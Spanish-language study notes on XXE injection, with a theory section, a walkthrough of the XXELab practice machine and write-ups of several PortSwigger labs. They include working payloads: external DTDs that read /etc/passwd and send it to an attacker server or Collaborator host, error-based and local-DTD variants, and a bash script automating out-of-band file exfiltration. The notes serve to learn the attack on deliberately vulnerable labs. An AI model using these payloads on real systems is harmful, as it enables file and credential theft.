-----
Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

- **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

## Notas de la Practica

Una vez que tengamos desplegada la maquina vamos a ver lo siguiente:
![[Pasted image 20250825092200.png]]

Lo primero que vamos a hacer es interceptar con ayuda de BurpSuite las peticiones de esta web:

![[Pasted image 20250825092455.png]]

podemos ver que estamos tramitando una estructura en XML pero para comprender esto vamos a ver que es `XML`:
![[Pasted image 20250825093131.png]]

Entonces XML que es Extensible Markup language se encarga de transport datos siguiendo una estructura de árbol y lo mas común de ver son `etiquetas (tags)` y `Data (Datos)`

Entonces en nuestro caso lo que vemos es como se trasmita la estructura en XML y en vase a esto la victima o el servidor nos dará una respuesta.
![[Pasted image 20250825093252.png]]

Continuando con la maquina vamos a enviar la petición al repeater y la vamos a enviar para ver la respuesta:

![[Pasted image 20250825093427.png]]

Como podemos observar no dice que el correo ya se encuentra registrado, vamos a alterar el campo para ver si esto esta así por defecto o si nos deja continuar:

![[Pasted image 20250825093534.png]]

vemos que sale lo mismo lo que sugiere  que esto esta de alguna manera bloqueado, ahora lo que a nosotros nos interesa es que al parecer esta tomando los valores de la etiqueta email los esta presentando en el mensaje.

Con esto vamos a primero entender que son las `entidades`:

![[Pasted image 20250825094633.png]]

vemos un resumen total de lo que es por lo que vamos a proseguir en la maquina.

Como ya vimos lo de email se representa en la parte de la respuesta, lo que vamos a intentar ahora es de que con ayuda de las entidades podamos ver información , entonces vamos a modificar de la siguiente manera:

![[Pasted image 20250825094924.png]]

como vemos en la imagen con ayuda de `DOCTYPE` definimos una entidad llamada `myName` y con el valor de `stark` y luego la pasamos a email de la siguiente manera `&myName`, con esto vemos que nos responde la web:

![[Pasted image 20250825095056.png]]

vemos que estamos siendo capases de crear una entidad y que su valor se represente en la respuesta, aquí es donde nos aprovechamos del XXE de la siguiente manera:
![[Pasted image 20250825095234.png]]

Podemos ver en la imagen que con ayuda de entidades externas y el uso de wrappers logramos volcar la información del archivo `/etc/passwd` donde ya explotamos el `XXE`.

Bueno en el caso de que nosotros intentemos lo anterior y veamos que no logramos volcar la información podremos intentar también un ataque el tipo `External DTD (XXE OOB)`:
![[Pasted image 20250825100252.png]]

por lo tanto volviendo a la maquina vamos a suponer que la web no nos deja declarar entidades directamente y es allí donde aplicamos lo anterior de la siguiente manera:

primero nosotros podemos verificar si podemos realizar peticiones usando un servidor y viendo si la web realiza una petición:

![[Pasted image 20250825100626.png]]

![[Pasted image 20250825100637.png]]

En este caso vemos que si logramos realizar peticiones, ahora en le caso de que no podamos llamar entidades, vamos a crear y llamar a la entidad desde el propio `DTD` de la siguiente manera:

![[Pasted image 20250825100937.png]]

![[Pasted image 20250825100947.png]]

vemos que la petición nos llega por lo que desde el `DTD` logramos llamar a la entidad, ya con esto vamos a crear entidades externas alojadas en nuestro servidor por lo que el `DTD` quedaría de la siguiente manera:

![[Pasted image 20250825101119.png]]

ahora estamos tratando de llamar a un archivo llamada malicious.dtd en nuestro server por lo que vamos a proceder a crearlo con el siguiente contenido el cual tomando en cuenta que no podemos ver el output en la respuesta me va a enviar el contenido del `/etc/passwd` por una petición a mi servidor web en base64:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.70/?file=%file;' >">
%eval;
%exfil;
```

el flujo es creamos una entidad `file` la cual se encarga de almacenar la información en base64, luego declaramos la entidad `eval` la cual se encargara de tramitar una tercera entidad `exfil` la cual realizara la petición con el contenido en base64 del `/etc/passwd` y la enviara a nuestro servidor, por ultimo se llama a las entidades para que estas funcionen ya que si no lo hacemos no ara nada.

Ahora dejamos el servidor corriendo y mandamos la solicitud a ver si podemos obtener la información:

![[Pasted image 20250825102121.png]]

vemos que al servidor llega primero la solicitud de `malicious.dtd` y luego que interpreta eso nos llega la información en base64 por lo que vamos a ver si tiene el contenido que esperamos:
![[Pasted image 20250825102235.png]]

como podemos observar ya tenemos el contenido del archivo y esto lo podemos replicar para cualquier archivo.
Ahora como algo extra nosotros podemos crear un script para automatizar esto de la siguiente manera:

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename #le pedimos la ruta de archivo al usuario para que sea dinamico.

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.70/?file=%file;' >\">
%eval;
%exfil;
"""

echo $malicious_dtd >malicious.dtd

python3 -m http.server 80 &>response & # almacenamos todo en response y lo ejecuatamos en segundo plano

PID=$! # almacena el PID de comando ejecutado antes

sleep 1

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.70/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>0999999999</tel><email>
stark@stark.com</email><password>stark1234</password></root>' &>/dev/null

kill -9 $PID          # matamos el proceso
wait $PID 2>/dev/null #esperamos a que el proceso muera

echo -e "\n\n[+] Contenido del Archivo:\n\n"

cat response | grep -oP 'file=\K[^ ]+' | base64 -d
echo
```

ya con este script logramos automatizar esto y ver archivos del sistema:

![[Pasted image 20250825104304.png]]


## PortSwigger

### Lab: Exploiting XXE using external entities to retrieve files

La vulnerabilidad esta en el momento que se tramita la petición para ver el stock de un producto y si capturamos esta petición lo que vamos a ver es lo siguiente:
![[Pasted image 20250916102548.png]]

Vamos a intentar cambiar el `productId` por otro valor a ver que sucede:
![[Pasted image 20250916102715.png]]

Vemos que se refleja el valor de test pero mucho no vemos, en este caso vamos intentar inyectar entidades externas a ver que logramos:

![[Pasted image 20250916103034.png]]

com podemos observar logramos crear una entidad externa llamada `myName` con el valor de `stark` y al definirla en la estructura vemos el valor de esa variable, ahora nos pide que listemos un archivo, nosotros podemos hacer uso de wrappers para extraer información de la web:
![[Pasted image 20250916103307.png]]
Perfecto, con ayuda del wrapper `file` se inserto el contenido de `/etc/passwd` de la maquina victima.

![[Pasted image 20250916103344.png]]

Lab Terminado.

### Lab: Exploiting XXE to perform SSRF attacks

Al parecer la máquina esta empleando un EC2 el cual no es mas que computadores virtuales donde se ejecutan las aplicaciones.

Bueno el objetivo es lograr que la maquina realize una cadena de peticiones hasta obtener una clave privada de admin, primero interceptamos la petición, en si se tramita al momento de revisar los productos disponibles:
![[Pasted image 20250916113139.png]]

En este punto vamos a intentar hacer llamados con ayuda de `SYSTEM` mediante un `DTD` :
![[Pasted image 20250916113327.png]]

El echo de que nos de una respuesta clara y no un error en seco nos indica que algo esta tratando de abrir o nos esta listando algo, lo posible son mas directorios por lo que vamos a ir agregando los diferentes directorios que nos den hasta llegar a algo concreto:
![[Pasted image 20250916113446.png]]
![[Pasted image 20250916113504.png]]
![[Pasted image 20250916113528.png]]
![[Pasted image 20250916113559.png]]
![[Pasted image 20250916113638.png]]

Perfecto vemos el contenido de los diferentes archivos.
![[Pasted image 20250916113705.png]]
Lab Terminado.


### Lab: Blind XXE with out-of-band interaction

Bueno en este caso tenemos igual una maquina con una XXE vulnerable pero a sigas, no tendremos donde ver los errores y tampoco los veremos reflejados en ningún lado.

La vuln esta en el mismo sitio a si que vamos a capturarla primero:
![[Pasted image 20250916114119.png]]

en la imagen vamos ya que intente una inyección, pero en este caso no vemos absolutamente nada.

El objetivo en este caso es relativamente sencillo ya que solo vamos a enviar una solicitud mediante un XXE al Collaborator de BurpSuite por lo tanto lo vamos a hacer:
![[Pasted image 20250916115725.png]]

![[Pasted image 20250916115737.png]]

Listo maquina resuelta.
![[Pasted image 20250916115750.png]]
Lab Completado.


### Lab: Blind XXE with out-of-band interaction via XML parameter entities

En esta maquina vamos a ver como tenemos que usar los parámetros de entidades para poder filtrar la información en casos como este donde no se pueda ver la información.

Ya sabemos donde esta así que vamos a capturar la petición:
![[Pasted image 20250916123416.png]]

Vemos que en realidad esto ya no funciona debido a que lo que se emplean son entidades externas, ahora esto lo podemos cambiar a hacer entidades de parámetro de la siguiente manera:
![[Pasted image 20250916123722.png]]

Vemos de que aunque no tenemos el output visible por algún lado no tenemos errores y esto es una buena señal, ahora vamos a hacer de la misma manera una petición al BurpSuite Collaborator con el objetivo de ver si se ejecuta de forma correcta:
![[Pasted image 20250916124207.png]]
![[Pasted image 20250916124248.png]]

Perfecto vemos la petición sin problema.
![[Pasted image 20250916124314.png]]
Con esto Lab Terminada.

### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

En este laboratorio se complica un poco y sigue siendo a ciegas por lo que ahora vamos a tener que filtrar la información.

Capturamos de igual forma la petición inicial para ver que es lo que tenemos:
![[Pasted image 20250916130544.png]]

Luego de unas prueba lo que vemos es que si podemos hacer peticiones como al Collaborator:
![[Pasted image 20250916130621.png]]

Perfecto en este punto lo que tenemos que hacer es tratar de extraer datos.

Bueno el lab cuenta con el `exploit server` así que vamos a cambiar la petición y vamos a ver si podemos enviar solicitudes asía alla:
![[Pasted image 20250916130838.png]]
![[Pasted image 20250916130848.png]]

si se realiza las peticiones, en este punto lo que vamos a hacer es crear un archivo externo el cual sea interpretado y nos permita el envío de los datos y el código es de la siguiente manera:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://nwnpswczd30pylzx2c6qfouttkzbn4bt.oastify.com/?content=%file;'>">
%eval;
%exfil;
```

Veamos, en la primera línea estamos definiendo el parámetro file el cual se encarga de hacer el llamado al contenido del archivo `hostname` en la siguiente línea definimos la entidad `eval` la cual va a contener una entidad interna donde eso de `&#x25;` es la forma de representar un `%` y la forma del porque lo hacemos de esta manera es debido a que si usamos el `%` al definir la entidad interna `exfil` lo que se puede o suele interpretar es que se esta expandiendo la entidad `exfil` y al no tener declaración da error, entonces al declararla tal y como lo vemos lo que provoca es que se interprete como un `%` y listo, como dato extra si es necesario representar alguna otra cosa que no se requiere interpretación o que da error lo podemos hacer con `&#x` y el aumentamos el valor del signo en hexadecimal, en este caso lo que tenemos es `% -> 25` entonces queda `&#x25`. Ahora en esta entidad interna de `exfil` lo que se hace es realizar una petición, en nuestro caso al Collaborator pero dentro de esta petición expandimos la entidad de `file` lo que permite enviar su contenido. Por último para que esto funciones necesitamos expandir la entidad de `eval` primero, esto debido a que si expandimos la entidad de `exfil` no se va a reconocer ya que esta pertenece a `eval` una ves se expande `eval` expandimos `exfil` y esto debería funcionar de forma correcta.

Ahora vamos a realizar la consulta desde BurpSuite al servidor exploit para que se ejecute y ver que obtenemos:

![[Pasted image 20250916132821.png]]
![[Pasted image 20250916132836.png]]
![[Pasted image 20250916132852.png]]

Perfecto, usamos el contenido para cargar la solución y listo.
![[Pasted image 20250916132932.png]]

Maquina Terminada.

### Lab: Exploiting blind XXE to retrieve data via error messages

En esta ocasión, lo que vamos a hacer es aprovecharnos de los errores para poder obtener información mediante estos.

Vamos a comenzar a como siempre capturando la petición que contiene la vulnerabilidad:
![[Pasted image 20250916160640.png]]
Perfecto vamos a jugar con diferentes inyecciones a ver que logramos:
![[Pasted image 20250916161351.png]]
Vemos que con la petición que tenemos nos inserta el nose de la web invalida que intento cargar, esto nos puede servir en realidad ya que si lo pensamos y luego de un error nos inserta texto podemos intentar con un archivo malicioso externo para jugar con mas declaraciones y ver si podemos insertar la información que queremos:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; request SYSTEM 'file://nofunciona/%file;'>">
%eval;
%request;
```

De forma generar lo que estamos haciendo es aprovechar cuando el error se acontese al no encontrar lo que se busca y nos indica la información del archivo que se busca, lo que hacemos es que la información primero se solicite y luego se inserte, y ya con esto logramos obtener la información:
![[Pasted image 20250916162150.png]]
![[Pasted image 20250916162200.png]]
Perfecto ya tenemos la información en el output.
![[Pasted image 20250916162240.png]]

Lab Terminado.


### Lab: Exploiting XInclude to retrieve files

Este laboratorio contiene un XInclude el cual es un mecanismo de reconocimiento e inclusión de xml, cuando se emplea usualmente no vamos a ver las típicas etiquetas XML por lo que es una buena idea probar este vector de ataque.

Bueno vamos a comenzar capturando la petición para ver com oes que se están empleando en esta ocasión:

![[Pasted image 20250916165420.png]]

Como podemos observar no se ven la etiquetas habituales, por lo tanto como atacantes suponemos que se este tramitando o haciendo uso de XML y este implmentando el XInclude, aquí podemos ayudarnos de webs externas para ver como es la inyección y nos queda de la siguiente manera:
![[Pasted image 20250916165618.png]]

Esto también es valido cuando no podemos modificar cosas como `Doctype`.
Con esto debería estar la maquina resuelta.



### Lab: Exploiting XXE via image file upload

En este lab vamos a ver como podemos emplear un XXE mediante la subida de un archivo.

En este caso cambia el punto donde se esta inyectando la vulnerabilidad y es que al ser por subida de archivos lo que nosotros vamos a ver es un punto donde podemos subir un avatar el cual queramos usar:
![[Pasted image 20250916165940.png]]
Rápidamente lo que podemos hacer es buscar en la biblia de todo hacker `payloadallthethings` y ver si tenemos alguna forma de usar esta vulnerabilida:
![[Pasted image 20250916170253.png]]

Vemos que si y vamos a usar el classic para crear un archivo malicioso que vamos a subir a ver que sucede:
![[Pasted image 20250916170420.png]]
Podemos observar que no es necesario cambiar el nombre del archivo, además de que insertamos tal y cual, en este caso quiero ver el hostname pero si funciona es cuestión de modificar para obtener la información de lo que sea que nosotros queramos:
![[Pasted image 20250916170630.png]]

No se ve del todo pero allí esta la imagen representada, es cosa de hacer click derecho y ver la imagen en tora pestaña para que se vea mucho mas grande:
![[Pasted image 20250916170756.png]]

Vemos que ya tenemos el contenido del hostname, con esto vamos a lograr completar la maquina:
![[Pasted image 20250916170916.png]]
Lab Terminado.


### Lab: Exploiting XXE to retrieve data by repurposing a local DTD

En este lab tenemos que cargar el contenido del `/etc/passwd`, una de las restricciones de este laboratorio es que no podemos cargar de forma externa DTD como lo hicimos en un laboratorio anterior.

Los sistemas que tiene como entorno GNOME  usualmente tiene un DTD en `/usr/share/yelp/dtd/docbookx.dtd` que contiene una entidad llamada `ISOamso`.

En este caso vamos a provecharnos de este tipo de entidad interna valida para intentar hacer cositas.

Vamos a comenzar interceptando la petición:
![[Pasted image 20250916171700.png]]

En este punto lo que se tiene que probar absolutamente todo lo aprendido y cuando llegamos al punto donde no tenemos que mas intentar, vamos a referenciar entidades internas:
![[Pasted image 20250916172003.png]]

veo los errores se reportan y podemos intentar aprovecharnos de ellos para insertar allí el contenido, ahora el problema es que no podemos usar archivos DTD externos por lo que tenemos que todo representarlo en la misma petición de la siguiente manera:
```dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///noexito/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;exfil;
' >
%local_dtd;
]>
```

Vemos a comprender el código por completo primero cargamos como entidad al documento que lo contiene, esto en la segunda línea, a continuación reasignamos valor a  la entidad en ese documento que seria `ISOamso` y lo que vamos a cambiar e simplemente todo el código que ya conocemos para DTD externo es exactamente lo mismo. ahora explicamos lo de `&#x26;#x25` se esta representando el `%` la cosa es que como ya usamos anteriormente el `&` fuera del mismo para representar el `%` en la siguiente tenemos que representar el `&` en hexadecimal, esto solo para el primero símbolo, luego también para evitar problemas lo que si hiso es representar las `'` como `*#x27` para evitar problemas, por ultimo al llamar a las variables también representamos el `%` como hexadecimal y listo, expandimos y vamos acopiar esto en la petición para ver que logramos:

![[Pasted image 20250916175557.png]]

Perfecto vemos que obtenemos el la respuesta el contenido del `/etc/passwd`.
![[Pasted image 20250916175644.png]]
Lab Terminado.